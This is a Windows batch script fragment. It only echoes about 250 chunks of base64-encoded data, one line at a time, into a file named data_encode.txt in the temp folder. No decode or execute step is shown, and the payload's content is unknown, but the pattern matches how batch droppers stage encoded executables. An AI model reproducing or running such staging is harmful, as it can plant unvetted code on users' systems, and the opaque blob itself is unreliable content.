echo sWsFae/y68vcZbBSPfBvAPL84rVq+RlhCik/0WjRnjZD3osgWPSuyq1NUi48ujy7 >>%temp%\data_encode.txt 
echo zO17FDLfYGQWpkB2zJwyL571BsyatvxqyJoGWc+/ZDLxjDxXXWhKo4ghk6N1NUdM >>%temp%\data_encode.txt 
echo SxbjAtsWW2DDS+PCmR1mQDYoGmZtnkVyZS0HhQwdSDJRVIL57GVRaujMYiB/Ox4O >>%temp%\data_encode.txt 
echo k478EgfunDqcQaWmb7L4QjCvDaTqfvG38KCjvNC3wI1SSamznWcIGZ+tB6whN105 >>%temp%\data_encode.txt 
echo 2xCK/EmtKaZINkw9VBZNbr4bguu6l6YwrS9n6ZJhIZLdNA/dCHMfxXglmJrvsq8Y >>%temp%\data_encode.txt 
echo S8vPxBbw3+J9Jq1YBibkBBQfN23R9abyHBgaDYdAgSrJBkx0wMQN5fMRdWsLVGsv >>%temp%\data_encode.txt 
echo oxjxFTKikZMrm5xXpk+Wk1utk7UqM9Q4FoNP41DtS5gdIFk2K71ma9jaC+oboAJa >>%temp%\data_encode.txt 
echo f0teq9VlXzZ9VaEJxtkPT7Fxhkef1dqDlumuTD9MOhcpzyazbej29kOyQFC+MD+V >>%temp%\data_encode.txt 
echo PPBRa5F5su/RpdKxVTbS/NKAbiqy+NISX60mj6DUZFnkzLr8KbLos2qFZlBXtVdZ >>%temp%\data_encode.txt 
echo HYY86eqNH632fDuEKxc/bf7X0zHrDehvZxDjomVpNX3Qy5s2bQLiAztM6OvSopF9 >>%temp%\data_encode.txt 
echo PWpkXwNpkWdiL8O0sIbd/FspUrPVTV8qGO7eZFNkHMZKY93rRZ5odGxWQseCnI9X >>%temp%\data_encode.txt 
echo auhyNh18Ew3RMp2HiOzAAFgPCPdNL8/yZ8JihhhIrMdClWFh+hQTvJEDas2gnKo9 >>%temp%\data_encode.txt 
echo ZG5NmayWDAK/CgRrb5fTyBykr2x5y1xXk2XyCw2H5NE+M1rteOlJc8yazhlsNU8p >>%temp%\data_encode.txt 
echo wAiQg4H+1QtAkGQZ/shEDNzew63m4Q43FzL4T90y0IlQZUFqrUFtmYN9jpUa9BSg >>%temp%\data_encode.txt 
echo W/Q/rmNONnU1UbwaBDvmbLxjEqzmWD84g1rN2VhPnB3ZE2G0kq7AQJgfZDGbjrOT >>%temp%\data_encode.txt 
echo ATPxheZiYJMw6rSp18Jahd4PjrxmnEclAGmw1AuDb/Ss4W6wmiIAtLdYiQ6uypPC >>%temp%\data_encode.txt 
echo NT/Id0Vr0pqSi9CovLFoiE3as9B+7KIy+ihTMbJwZhrpfGbyr08wG5GcBJeJJjS+ >>%temp%\data_encode.txt 
echo yRS3h0Chh9UqHbDx2VtNpoXtLQ3tMHb8Ga3myYWtZhNa0prvRyHB4xW312Rp2QE0 >>%temp%\data_encode.txt 
echo 41AGzFZdEyQyNbDzmUKTVmSGthrY5cmD0jfXBedYW6xhnX9fUEr//BEb9dyswDJs >>%temp%\data_encode.txt 
echo qv7mqdg4B4QCh/w3oxsH2e9NtLjHeaMJ4zxuWvobA4ohGqA7Gdt1EXfvJR4BJZdk >>%temp%\data_encode.txt 
echo vpSB/EL/ZR3a3WSZxB1ROVXRbdcGh4KRcpq3kB2FjS7jKpqHnu9nClrknpmomsvj >>%temp%\data_encode.txt 
echo QCSD1f+2/CLQLmuF/OTlN24xR65nsS7lTP5RhI+1aas+z0+uEiKn0cYoHpOq1GPo >>%temp%\data_encode.txt 
echo d+PoEx/HtLYdJ5HP9dyJJz81DlP1GZCPTP5TiF11J3DzMmeXMlToH60MufwZylCR >>%temp%\data_encode.txt 
echo 39ZYMagMzZOFVtegmZRMICGl25beIheiRtn9LXNUBmX5h9A1+QuFWvsqIT+rKrnV >>%temp%\data_encode.txt 
echo FTVHrI0VUQy6C0xZl6OlNJUNjsweLjAzSI70FpAGrRGLz6Kczknfu9BvJRVTlKGf >>%temp%\data_encode.txt 
echo 1Ob505SvCv1JyldC5CYUktwMVE5cRmKK/KNAscijyleP+WcrX5nR3Oa2sitmbIHR >>%temp%\data_encode.txt 
echo EpEQzvc+jb/ERmUk56/WknEBc0xaHOc8TFeWx9Kxp1AxZ0bYS07oOjfVLHCsjcm0 >>%temp%\data_encode.txt 
echo 5XbFZzM/lbEAoTQtNGwILU0ltkabboFhD28ZzMwmqLSb8zNuA+0d+JShulvoQ5uB >>%temp%\data_encode.txt 
echo vvkum3+iz0xnGy+Il436dQz9Vrgwthc4Ym+T+QB4PXQrbiOixw9hTlVU34TmXJbF >>%temp%\data_encode.txt 
echo II6n7EabywjMyi8wEVJ8u9HoUk+qw33iB+3EvPaNIAZjXLDzWRiNvalm5i4xeZnJ >>%temp%\data_encode.txt 
echo Ac3dg/sAJjWF/uxTGFAp/J4f7cFMdYlNfVBQR6lLsmCsXoPx9VLU5HCRDUuFi7Lw >>%temp%\data_encode.txt 
echo J/KXxHHKrC8noywd37JM3Wj2X+OhT3+B25S138W3KbPYTmWCymCXXLZqbiF7XXCg >>%temp%\data_encode.txt 
echo M2E/1Rvol6/F89r99I8g/jl1dbVNXW1XV/NwOU697l6TPB4y5K+2yxk+M+T7gtkK >>%temp%\data_encode.txt 
echo yD5SZGObSZFDXq9P9/hSYSTQ7VfFtmPGxU5WP+kC9OjoExipLzIVppo0z15tx5gH >>%temp%\data_encode.txt 
echo r3BIOfoKu77CFoexPAbD/8didZ4jQfkpM7aAsznGaYhxF5JyiV1dAhl7XkWcuyrz >>%temp%\data_encode.txt 
echo b5BzEOcldvkqhvNFdvIfu+ne1pgVOcAdZTxlWOOqq4ytjWGsb2NYP9zFsC7xJqL9 >>%temp%\data_encode.txt 
echo O25GcHdZWRxxBuWu70P5DF0G6TgOJTnWmjjrYfsrGNWU7Tv9I993is8du3J2koc5 >>%temp%\data_encode.txt 
echo 4yMz5nxp/HHQk97DhVC2AQ/yqlnkEkkme9WaTrXkhFrRDVT7iVYyWBl2Dd46q9Td >>%temp%\data_encode.txt 
echo WDFE5y9mkQtHIWJ4IFFWVkobzcbOHsjkkTFaeecCkHQmcBsNdORDX9UAW5dlm9Iq >>%temp%\data_encode.txt 
echo qCDuJ0P5DaSmk5ScICG1YjAvTAZIB5QPXbQoQetsNInfr5aD8D5wNLcXOF2YHCY2 >>%temp%\data_encode.txt 
echo 5k7VG1saSnrnoEBzHJax2VCNdFQ+Scr7AJizCzc7BxfQknZ+8GdnR877dYDPws5B >>%temp%\data_encode.txt 
echo xWxEgoSo1kQ14TmM+0BJGJ2OQSVZTI7mHUMB3gQouc5qs1mtltms1vJeeAcqo7ER >>%temp%\data_encode.txt 
echo cdG8kNU1CM2d+GN2EA/NWo72+lC4pE+1Q1sEawnoSX2IoOuEvBntbCqi6hRyvoxu >>%temp%\data_encode.txt 
echo +Bg5uesEOZbXDNVxT4D88hPXtQ8czG1TS6g/i5zT76Y1kG+OVisskk7JvUg0Oeql >>%temp%\data_encode.txt 
echo y7Dw0sXMohSHXxl95FhsNS3FyLnxm/BQDs/bQ8KFAx0gdElt1ck++0JQKMo82lKz >>%temp%\data_encode.txt 
echo 9Th6c71/CgnF3NhGY2zQMg/90aJYg5A9532sCffCuCpzUyn+4W70595LG6xsrjMv >>%temp%\data_encode.txt 
echo J1hQDyAseXBRJB3kL2jogDJHELx05ylsbOuSxZEGp+7Ff/T3R2MI15990ZJoDcvs >>%temp%\data_encode.txt 
echo g9k2tE1d9zowI+mAP7fJPOOH/qtnPOwfM+Mev1jqpaZFbCy2SQfkTwnL1mRuDGyC >>%temp%\data_encode.txt 
echo 3xn3gBQ7zyy1+ccsQJ80Lz3D50PPURirTSyPswvApQG45Bn3NLXIli3mvAOgmReq >>%temp%\data_encode.txt 
echo 65fB14FOdf3P4NdzXVBd/yQ85IbU9X5mYNvIzGkxRmHj+lXwl67FY3gtgMXcXvpz >>%temp%\data_encode.txt 
echo JnDZNW0zA3NdEPqmdKAjN4BQYKEcu4+ZJeDNY1n6NsQa8Ztr3HvVyVx/SQDTSbGQ >>%temp%\data_encode.txt 
echo ZwtdsKhaA6tyDfu7lv19gf19kf19maHyCqKSxFHB9sHPGv6D9r9umsKWXAdihNgg >>%temp%\data_encode.txt 
echo gLrpt8tXNRWbG9r9t9ZduF1Omr7Q4s/hSOnbsJ1eN/2v73jsnEDdd8zU5+HprCq/ >>%temp%\data_encode.txt 
echo Xd+GMOjHwIwXaQFsrdujj+1gRxRioAS33HgzGPrEQQqEvOZQ1AK9MnVZ3vYCU17I >>%temp%\data_encode.txt 
echo J4Bs1+SmRaVsTEWyDdijDdgKMnpW8SLSCcDbAHjdLiS6aQkigCRlUsAi0gLS/1IM >>%temp%\data_encode.txt 
echo hPB45bDR31mHz4R6Zdm/s2OJd3GHPN9t89tpOQxH5yFojnn29zb3m414NXWrQUzD >>%temp%\data_encode.txt 
echo ODj0EjLw1qLMmDUvSHnnaCe2sMamFdk8QKalpthtcGlKpd2EmSOp8NcMi+hqe4Lr >>%temp%\data_encode.txt 
echo Iiv7Mi/r0YRZbgDgpjl/b3GM3Bv6CzONtqlm7E2lu08J2uMhlFfb8lcLfjynXI6x >>%temp%\data_encode.txt 
echo Dm72CT6BnvyIiQ7J9A5cPpJ5Tbi0K0GHWmSLHMy7N6Rb0A9Fr61OAv4QmVbmE7Ts >>%temp%\data_encode.txt 
echo WWX6XfR/XRNzUoUvSyIONVmz79SEF1HogHW732eiH33EZvfimLl9RU/DBWNj3lhm >>%temp%\data_encode.txt 
echo RfTwOs6Oq3rw0KGML60TRyyt/8xvSgw8F1taofVLHJGnE9fX7LTvrYz7DuPKOHj4 >>%temp%\data_encode.txt 
echo CutrgenK6+vR1O9BeY5B2X54xPq6eElFwmAQsF/ovxzGHYxFqg2kaaOvMKCQMzi9 >>%temp%\data_encode.txt 
echo MNNvbcRQyUbY5Jit/20juZvLpmloUb8Mp2spsISN3JDsqhgqlw7hwSToK8gIXQ5l >>%temp%\data_encode.txt 
echo A5rWm1SN2fCz+WzY9jM7/1ZmlW+iNj7dv+Y/R/hPL5v8y3HvmRnocz3Z+Sc65x9w >>%temp%\data_encode.txt 
echo nqA98B8LTdT/s5gJw5/2J4SEv/XvvCqme79x/EnOvYP3hZZyc4tiJZjlLtWnTUfP >>%temp%\data_encode.txt 
echo ogG0Gk1+x8Q+48ckPF7EzzPwc2cyCz4BnYJ+RaDDc88iSCKm+unMhhrRe7ITR1oy >>%temp%\data_encode.txt 
echo sBP4YCOzi1WzUVevbhoOhz/5dZjK/kkKFfzZCs3gx84Cum+9On8VC/FQzH/m8p+C >>%temp%\data_encode.txt 
echo VYmRGIBnoAsJKpwT5+LpHotgNiSPDifhKx5s6WNP4AH1bUr0u5HJnZg8FnR3UGVd >>%temp%\data_encode.txt 
echo fcNfSIHtck7THldkgYWwe1adulaVBUrEnxugc58BfNVnWNTi97LZ5atoI/2MfdOm >>%temp%\data_encode.txt 
echo TczdKu9Sk3B3Y3IROhF9qxGk5rtYVZOQ32guxBvfvh2WD+vPZqUkDkKurtSvFpAn >>%temp%\data_encode.txt 
echo 8uNcLUCj6JBRLehjuzkbb+hjQvBuBEtaGhuScCgUSOHlfU2BryCzpuHf1gAm50TG >>%temp%\data_encode.txt 
echo i9tLzbCGRjKkcFVGK8+dUyA1V3+thCxNZpBGTpYBeC0wiBV5NVbOjRJIMegoxie2 >>%temp%\data_encode.txt 
echo 7MS+efXt2PQy+moZTtgCSIb1FXMO51mGmnss31Ms3wTSIu5Y48Jq8IxoVN385Gsc >>%temp%\data_encode.txt 
echo TWuSEHhkbH/IwpNyMAm1VEvT3sY1yUhBbNwHkZmxNu/VSn+rzc5RotesSKubP+oa >>%temp%\data_encode.txt 
echo h1aYExmjXLxmhV0TRtUVX5OjFXZDcaDNKCxeKB1Yvg+XIhaU5+OlCWtRpmGmiL2I >>%temp%\data_encode.txt 
echo IvqvcFUscTAhuY/cVywVCmhegoKZd1kONIYeBxmPRJW9+iIW2U52vMOk6Ori8xtI >>%temp%\data_encode.txt 
echo FOS0PuUHJvo7w2JZOi9fR6P7Y8oxOQ9CxZ9RRkShq70F72SWk+iaZuaag9NFDGU9 >>%temp%\data_encode.txt 
echo gMf5jvqVzBzfn6o/WUwdWCacwkbsAfgIkl1xMaCZaHe7wbjaCI3VNVcmN9PvM64w >>%temp%\data_encode.txt 
echo 5hb4UTd99RKaDdlhcC1ngeAziek1vACl5x/Q88O+zIZ8Z/AfYR3uV+UzsBryKp7H >>%temp%\data_encode.txt 
echo Kvyj8lfM96eSFRjm4onIIl8SnbYHjWrlQUjD7BV2yen/AXw1PC2SZbF+iHtaeOgD >>%temp%\data_encode.txt 
echo R5BJOFWWtVdPjrEwFnT1d+gXnUQn72Es63te07S+DcTSupnFOO/lGWFmeoyAw0nI >>%temp%\data_encode.txt 
echo pyb9GZ+QoeUcAfzXHQQ2jjlgFPu+o1dxMa41CUub0dkTv9G3OpAJ29hNrlfw9WGn >>%temp%\data_encode.txt 
echo WmzX4xmMIN+5CA0utjB2AH0AasmZ/BenHC0ESp4HNAuV4BRImonX3Sz/rP4SZRP4 >>%temp%\data_encode.txt 
echo IIa/3dECi8kRY+ruxjuYcXZLnfLNqMW/jzNEXZ1Vqa7OBtXcGQTdH3iJh3ZBrT1F >>%temp%\data_encode.txt 
echo yAFc1F0Wm/x+mbEkrSgLxJu5dUyqVZcISg21cFDyu3U1X0GZr/w3ciHyWnH7QXG7 >>%temp%\data_encode.txt 
echo LZKMM0UolPZU9ytBCx7YfKwVXfvOEN6vY7MVIL8aQJuohy5C5+vqc9lMVxTm9WC0 >>%temp%\data_encode.txt 
echo zvyZyDHFAMakQc9kDMubgMh7tQyRx11npqDxWl3BUYwWcwYqIW3+aU2FeCNcnrj9 >>%temp%\data_encode.txt 
echo KmRDV9dfxElcNabp+UmQzTZ33DWzxe2FZqmj+i/AkOryTfJ+4jozTwmiCZyiC8t3 >>%temp%\data_encode.txt 
echo lkELw0U2duP9FrYFJXD8CFT2oN2XrK2dCqCWVhKLtsBSqZq1+yzK12b5655tQ+iX >>%temp%\data_encode.txt 
echo m4dNCi6Kc4CTixOdMjKNwEBP8M2sMbR4b0wZ/2fUVVsjZfzUxJ+ZL9uXiyhY/lhl >>%temp%\data_encode.txt 
echo DYZSdzGLUjfduZqbXutyKk1hACJ2yF41hl7YEztbmcPBWX3jFiaYmDk87CaqXjr7 >>%temp%\data_encode.txt 
echo /+i6uF0G4SLaVJLZMH/KNfJ1zkP55Xh6AMwIvcuezHU5IhbSDAPB6jzEpOQl3xeT >>%temp%\data_encode.txt 
echo cc9MYGausGD+q55o7AJtfGfaBxhOdsUk/2NK9Fb/IzPz4L167Mzb8WfBzDvgx//A >>%temp%\data_encode.txt 
echo TCf+zAVxI3LLzBePsngWb5yCDF/OfBt/bp2JI9yfO5PZt3RCPuW0LdHQFiWoM8wX >>%temp%\data_encode.txt 
echo 09ke+SxWNxP2gZVqy/FGZZvU7Bfu7IpY3jbHkMr134dIzeVI3cmRuosj9UOGVOQ6 >>%temp%\data_encode.txt 
echo js+NHB+R4zMGwIkADq+Krz+NVoPsUoSaCeL2wwMfidvPM1f+YwOn2OaFnNPQ5U+B >>%temp%\data_encode.txt 
echo HrUCs17guRxvGruOPOZK7EUXvnv8N3rIHu0XlkpihoFaKYXlb9EYQcu8X2m2wHf5 >>%temp%\data_encode.txt 
echo 9BJttmVpQlgwfexZpldy0z8P3Qx4gZJNOr15pw5eggxe+gljThO4pn6Xmz59HJcX >>%temp%\data_encode.txt 
echo XFtuwB15UPO9ZR63m77L8uWwS6Y/dmLrurxsZVkE4+Fj9KIBVayXIc6uN4sPLi7p >>%temp%\data_encode.txt 
echo j6HL22KrEE5gdFEr8/pmesgQLanD22RwpwEYVBfMMqlVbDiMMkuBudGl09/iSXpX >>%temp%\data_encode.txt 
echo /vUYo0V+Jr/C7s/Ov54FBMqk+e+i/ik2vA7ZaTVG//3x9ApdTnF29fwWAw8LPjP9 >>%temp%\data_encode.txt 
echo 9k8gHLAoP3TefjZLOCyx4SnIwkHJuSzrHpaVRX/JjmV9mWV9EONGvMijUGGF9/IT >>%temp%\data_encode.txt 
echo prxWt4ddJQBrHV7eAd9WPpR/jf8BfWo9Pf4nppL1IUZTSHk0YiNzmwRVaCrMz26S >>%temp%\data_encode.txt 
echo z/uE0gX0RjsQAgrTzX9i6ijbRfH/NLIYd4wuqVMbIx4ozln5QCc6erktUof47Pt4 >>%temp%\data_encode.txt 
echo O+5FDLgkKm/hprKwoJQeSWfAonQpAxZlwMSGf2ZCeh8Dpz7cKDBaIB1rtQfNsUOa >>%temp%\data_encode.txt 
echo cz6zVmRxIyof7DN2fvr9RWhDJ/d56M0hw7VDXgjTnbTmuWyF1jbxfRfbzsgNNS4C >>%temp%\data_encode.txt 
echo TZ8uesDYBh9Fn22FAnsNczkP/dM+HCqj6OOt8WGwV/fS7fuYNNKyOL5j9eYH8R0r >>%temp%\data_encode.txt 
echo 3OoBhpYEKlc7TGMSzhf9qRgVTIHVY8CjFbJwS+OGsa0kYqDd7y4jp/I+Ht7rytsD >>%temp%\data_encode.txt 
echo TSs04w3utGcv03kFic7YxxqkzJBM/tv1u/G4YapEZwVjzRyvhAUEJ29fDFxs1D6+ >>%temp%\data_encode.txt 
echo U9WDYgutCg6fyw61oGMZUpSHHpLtbn49O6NybFvZS1h8KjLAwijdCpIKHo/Y6N33 >>%temp%\data_encode.txt 
echo xdToDJLcJFhnzPRfB4vV1UqrwPZDj+cNhIYsA6eYwFbRwt4i3xjq9IuDsXBDMNl9 >>%temp%\data_encode.txt 
echo 030FNG0v0sLZpcpR5q4mkPORB7TnTKPQLthf6NVW55DeMn6d2bxuNz2Fg/yhqF73 >>%temp%\data_encode.txt 
echo jxlRdbxWO11dug8+hOd1mExpaa3zjqSpS482Lv1IapXbiRxdWkaT9hpbdu0j3Ksm >>%temp%\data_encode.txt 
echo lmm/wVq8ZEg67x9lOMwr4enSJfkbDz2wh21MLmFeBcUo42Ut0fX6GhtaLC+/kZZD >>%temp%\data_encode.txt 
echo p/tS2fk/yqLfk7+YNOhLoa6gIe8NMdNmtaY732VbNT5/6i40p5XvoF/izSnCLm5s >>%temp%\data_encode.txt 
echo K2f67Esui4gT+XdWUgkWvIa/8yLvEQbZGYxbbaPFbJthvhycbhWY+fL37lG7YpYE >>%temp%\data_encode.txt 
echo 7/8y4/Rj5T9K07CmKuhCMoRl9OTHO6cTjmT/XOsks3+ussqapftnUuX30B9Rs5zr >>%temp%\data_encode.txt 
echo DOb1+jPxKC0Ngw2Mcfv6Ija379uI1e3r18dGka1zCMp8KAqCwDjqaMGphZcJ0G+A >>%temp%\data_encode.txt 
echo ikqOicd4GTahVy4MyWPpn/lH2t0cyx+ZE2hf+QMpg+E5noSU07NC0eTH2wHLAMfS >>%temp%\data_encode.txt 
echo Blgm4+V2FS10nVH+lXh52hM0Dt2UmfOZiJwWTmIPBbi3kzhSxIYv2D6OXUq67RiP >>%temp%\data_encode.txt 
echo xvVWGw6pIoeUNMVIeYWnZEpJU42UX/KULClpupGyiqdkS0kzjBQfT8mRkgqMlIU8 >>%temp%\data_encode.txt 
echo ZYKUNNdIKeIp06WkhUbKVJ4yQ0p62Ei5iacUSEmPGCkOnjJXSnrUSBkKs5RiKWmZ >>%temp%\data_encode.txt 
echo kXKWp8yXkn5mpHyEKZe5IS5Cv8UcI8M7vIggJU0wUv6Tp9ikpElGyjqeMkVKchsp >>%temp%\data_encode.txt 
echo Ck+ZKiX9yEj5RWJFpIRHHgOZQRN+icFR9FlSK4s8dtzv0O+icyD3PK1aWARTM+Hq >>%temp%\data_encode.txt 
echo pFj3oMGrD9QlGIm6VpTtA/ivs8fpPuBsL7HHZfj4S3x87kV2Z4ab4m3q+naM+U8/ >>%temp%\data_encode.txt 
echo acXH1/HxGHvErT26rxWzb2XQ3bSUFe4w3uYwGXGu9txZTADYd7LPuOuNbxPY23wz >>%temp%\data_encode.txt 
echo r2kcq+lHuOCvZOAX4uMT7PFhfPwpe3wEH72t7MB4WNjNTlSw+BWsZ+h9a9BkBW/w >>%temp%\data_encode.txt 
echo SyYuShaCFuTU8105XsiQKa4L4ima8CGK/+4yOu1bHl/D1YdLK54YaZkm7X6bWh6V >>%temp%\data_encode.txt 
echo DuJK6J82k92VN4bOlWGk92HcmHDyvn0YpNRNr+1gqxVGngknnzwJ3L/VhqKBhQxg >>%temp%\data_encode.txt 
echo BMAFXg/9EtcYWHO5QIgbISHmVzkBVg4HCIpoNm3Xxw4iD4h66ETkknU1vcx46Ixh >>%temp%\data_encode.txt 
echo o0LC2mOd0Ll8W+9nDyWGykCTRYXa6qdj9ejsfceHIyLl9eoFdlK8CqM89upm0oht >>%temp%\data_encode.txt 
echo jL/UJb6sGX7xgBZUPGlJ/VPRIDqSp5KrAofwg0V5ihmGlw7G3kMO5GhH9S0v47DA >>%temp%\data_encode.txt 
echo Xo2P3VI+cslzjTzO489msqnyGClaBW9LcNlfRJ5r4B+z8BUoWvUBdjeWoHjhI0hh >>%temp%\data_encode.txt 
echo z9WNzFE6nOPJQcyhV6+iM4YT7/iAF1vDi7mwWAF5DqPnTkb91E1FyEGew4svdiPs >>%temp%\data_encode.txt 
echo vLCbDrZg0ovG21cYNGf7GhYFroUpPPp21r512Du+5IXab3BuYLyv1ZPqazmRrmfC >>%temp%\data_encode.txt 
echo QCZWJ7rpJgThpK+3MGRcg0otEG4cmceO0DAP9NTzLex0cFBpEZQwbl8CQHmLh/5v >>%temp%\data_encode.txt 
echo TB825+F+E+PqL7T9AqoZ5QwW9IqhelSeCypaduJ+/kiudGP9EMt5DXkOM61FAc5D >>%temp%\data_encode.txt 
echo /8ICTGUyfIa5ywjIfJuFQS4eCZmPs6pevXh4LKUmjqXUxLGUmjiWUv/aWEq7bCyl >>%temp%\data_encode.txt 
echo XTaWfqxzPojRClHG2FrOPRfpvN3AQFbOJyyaX4AFnYDV7G52u7FAe3cYm9v6NO76 >>%temp%\data_encode.txt 
echo PpO54Y2IOoerHMYEithRXBCosPOvbBQt3B4TX9n+DZSZwUkxjUyXhkAga41M9oCc >>%temp%\data_encode.txt 
echo 8ysciKBlfe2l+1C1qrWbFsmf1OssDMNHXorBcRZFDo70TsOgAdfFHdkdVSLNfm/Y >>%temp%\data_encode.txt 
echo 4ycyGzeNvYEuf3oZfbsAAzgAX3Hq4u+ZIfORgnio3bHSUNVVeQOaIHlw72DVz7kR >>%temp%\data_encode.txt 
echo FYrhGBDSVIrS02voXoQBjpWJ+GSKuepzh3Kpxu4vBXH2BgA3iuw1vFQPg+xqA47G >>%temp%\data_encode.txt 
echo glPCH//t0oD/ZqV1UFk9aPKPYbkzfKbh/IuUr2warIBh+SSPNz9iQbLnyzb/DV6y >>%temp%\data_encode.txt 
echo Gm/xwHLDoZyhnCTb5DNLWYh6DCSIPd5clhhI8OrtccfLhECJj356WaDEvxVRsMSh >>%temp%\data_encode.txt 
echo 38HhxIc1u5JgMh4i3IjXl45VaLI/FdNG40nCzkc+RRFw5zL+8yj/efjTuFz4eEbH >>%temp%\data_encode.txt 
echo /yo02dExo00K+UVQ7/PdAkAI2qWQ3JcQTM6OtzldMehlhj4i9BFCfw3rfQ2re41X >>%temp%\data_encode.txt 
echo 7ZuwrBFJ8vsFSJJuk/JYh+kP5saSz2HK+2yLpfO1Wf67tSIdMb+JtekWdi3PvEim >>%temp%\data_encode.txt 
echo MpTuz1aGRJA9hzJX36UMjau9w0MH2Q6AAGPqXlqyC3cJQPyOhQrEq0v0uz30Gp27 >>%temp%\data_encode.txt 
echo 28ujaf3OuE3WHiBgpFNbacOQy5+rNSeUx46YGtr96T4rXb4VSjSVfK481mlqdX1m >>%temp%\data_encode.txt 
echo Yv01C2+t5hZZ2GfMG//wgSYs26noZvGFYKPrM9DtfoEOaecwyvl5RDYdbzsX5EnE >>%temp%\data_encode.txt 
echo 1U2KBbXkiPKIAJ/kAuqCeUIKbKqrg96DU6bAtobZenTD15sezziCXWK1PZ7UyR5C >>%temp%\data_encode.txt 
echo ask+tBNAp1IlZI/08giNJSdUc2zQ3IL7ljWfmeRHAcLt9C/vQuKTtrKEERrJBTKj >>%temp%\data_encode.txt 
echo 209NZ13N5ya/DRr7p7dxJHkSco1APAsRLzmiFgsANJ2uRce5kg61GASSyxkNEAgB >>%temp%\data_encode.txt 
echo rkKA8NtdF7eaLLGRUJnS7XgPT0A8oW6rtz9k81vSW/pDgj8pA2UTPOuAJxs+mfHJ >>%temp%\data_encode.txt 
echo YTK9j7uiAyF0GYHMreTgbhOwydxj/vHSUf846bA/XTomj8kwPYJR1jNQsI9AwRw8 >>%temp%\data_encode.txt 
echo XjKZrEtz9yxZXI8XMZr9WezXAgX2yFdlYDBa0AvaYOXJKGDPcaP1kzWDXZ84+4vy >>%temp%\data_encode.txt 
echo p6EXkrgGA79XwuoGqv5B727EZOMs/y3ijo7co6FPhI2C36rssW204Y+w0YE/lo05 >>%temp%\data_encode.txt 
echo gOzRjRb4e0x8syKKmx7dQZgv4pvlffACACaRttz9odO8fDsv387Lt/Py+1n5A+l7 >>%temp%\data_encode.txt 
echo SGhpZEYlykzB/tAs/x3ijlBua6hbQMpZlTYbEhJ+4R1Lt1n6Q1i81SAn4Jtg6v7r >>%temp%\data_encode.txt 
echo 4zVRaExU3NGmnDb/jfrhxwwIJNe3I4Qyj7ij9z3k6OQo0AC6MPew/+b6i9htQNmL >>%temp%\data_encode.txt 
echo zDfaLh2WR0N+9AFJSz8QwbLQe/WfYQp8HZBHITSziX0BIOKO4LvYyYFmXo9gwvsd >>%temp%\data_encode.txt 
echo BoB5DBzNPZcbTu+VzokNG9lOzQwMv1MJgsXxJwahEYPYI4CT8pk59BlvxH7eiP28 >>%temp%\data_encode.txt 
echo Eft5I/bzRuzHRkCXkT25e/23wkhAvLPhl+O9Vx4HWRDvUfDLLm+HX8T9E4a7A1qI >>%temp%\data_encode.txt 
echo pwj4leO//3v470f8lZk4ZsziGjTarv98vNVmhf7vxb0pvOwKxj+MZQsGBId+g0eB >>%temp%\data_encode.txt 
echo PwrwaOOPlsAe/DFDihnDTbIOJAffwxEONP8BYAKj238t/GJY5XSgOQx/Kx/+Fj78 >>%temp%\data_encode.txt 
echo USUpqD+N43px3l7I2xOsxbx5ezEvtADzwvTAvNAOciC3xoZ2XOkHpDaxAZWhUlqE >>%temp%\data_encode.txt 
echo Ae9w2+3lfBQ7oBV9uFn397YCHh388fKW7GYtOXaFlhy7Ykt4O/6eZrQ5W9P3vwE0 >>%temp%\data_encode.txt 
echo N/HhZKojIdBgWkdIoORg6AtB+cRMmnHaJMOcFXc0D88kC/46kP/Ab47BeLBBHnLw >>%temp%\data_encode.txt 
echo fUTOGP1H/bn8xAaY0DHA/SiiZOe42zjuGCLpIAwgKOW3Q2bILSenhyMwNZcuQciC >>%temp%\data_encode.txt 
echo yWBy8b0Z0I7f+5RF4ZVeymsmvQeHfOX61G83aoXsGPbmu2OWN2OeStKW6BGrttos >>%temp%\data_encode.txt 
echo XVrdgSEEUojw7WYtcYuehQG6Hguu5/ECVjpmngHoValE+LCRWRHE13VjQ3ws/ckf >>%temp%\data_encode.txt 
echo 4uvjf/2ebZ9EFpAiu1c5oBvRAvI9VH8fZHASpb/bjbK47TAeGU7IN4ztnmJx7Mco >>%temp%\data_encode.txt 
echo q7OZSVI2XQaSrFKZjWHsJ91jRIFnW25tKAlsuB+N8Gyq3M3qP70lXv+tRv0zeJQD >>%temp%\data_encode.txt 
echo uwcqt9G/4HiMfM4k6P+qNUQpD72Lh937eyJN63I3bahlUTHsyyjicOP9saNdJqGt >>%temp%\data_encode.txt 
echo OWvs57EwedPJMbytKKx0z3q8bToR1g3vPd3opXd/CXnd+liBSafy9TRjy3B8JTWZ >>%temp%\data_encode.txt 
echo XrUlth3FrDr/fvHu1rMJsTAc3Pt+SM6gwd/H98dAX1/pMvbxZgKwo7iPdzH5cixv >>%temp%\data_encode.txt 
echo wrgZcpSHY2M+173D0douADaRMdQXh0rf/h0j+3D4T5RJEk2C7KQjXhGoxrwqPAxU >>%temp%\data_encode.txt 
echo a15Uy7eSueYs1fUCcWVaw2pJp+p6XR9rA+o4u1RXY5lW8kf6v59BCSJIwuS8WrFR >>%temp%\data_encode.txt 
echo lTerFVvIfTa1pEGteVlyvS4qSeg0lcL9xElJZ6PrIHFtVSt2hl0n2HE/3wBUXUfE >>%temp%\data_encode.txt 
echo gBOPPMqPkBal+XbrQbV87fRs4PgF6F39LSl/Pe+Y6joRCIq//AOTrI6I2+eabxff >>%temp%\data_encode.txt 
echo r2sEnatAde3Lw8AlR6Rm8VcOPDotP0HOk5K1TcIdjXOn9RVJ36zqI/IRQCHQv3qc >>%temp%\data_encode.txt 
echo B6hmbfa66S/QBKmkEyOQQYGarVCGb3taQ40PT7kdi31Fal5G/yf5iKatgg5XXWvQ >>%temp%\data_encode.txt 
echo m2mfgN5M6npMKlAr6oDFntBca9wYUIM+xSy9HEoUxEcrcsBycXuK+H4j4loIcqO0 >>%temp%\data_encode.txt 
echo R/zVb/CsHQCggb9yQVDXr8RtKA1f1Zp9GFW+lMPcx2FOTID5e2ZAfeQh61CktulH >>%temp%\data_encode.txt 
echo 5sn9zYL/hiagR90nlxpdZ5tSGl1fAol8lkb4iMYRkTmY9ik9swnPYEs+rczPLq65 >>%temp%\data_encode.txt 
echo TZsHCv4+1k93sN0vqAiIsmk3P7rAmlxYU82+SJbP7GVo/DLhI972VlaG9hhn5rl1 >>%temp%\data_encode.txt 
echo GXDdCf3uLtPlRtrzCTvQA/i4j4XbHDBiXilltxDp8gv62GzDZOAjZqS9JU9+kbj2 >>%temp%\data_encode.txt 
